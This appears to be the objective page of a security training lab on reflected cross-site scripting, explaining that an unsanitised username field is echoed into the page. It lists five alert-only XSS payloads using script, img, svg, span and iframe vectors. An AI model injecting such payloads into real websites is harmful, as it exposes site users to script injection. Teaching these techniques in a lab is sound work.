📚 Lab Objective

This lab demonstrates Reflected XSS (Cross-Site Scripting) vulnerabilities. Your goal is to inject malicious JavaScript code and have it execute in the browser.

How it works:

  • The username field is not sanitized
  • Input is directly reflected into the HTML response
  • If your input contains executable JavaScript, it will run

💡 Try these XSS Payloads:

Simple alert:

<script>alert('XSS!')</script>

Image tag with error:

<img src=x onerror=alert('XSS')>

SVG vector:

<svg onload=alert('XSS')>

Hover event:

<span onmouseover=alert('XSS')>Hover me</span>

IFrame injection:

<iframe src="javascript:alert('XSS')"></iframe>
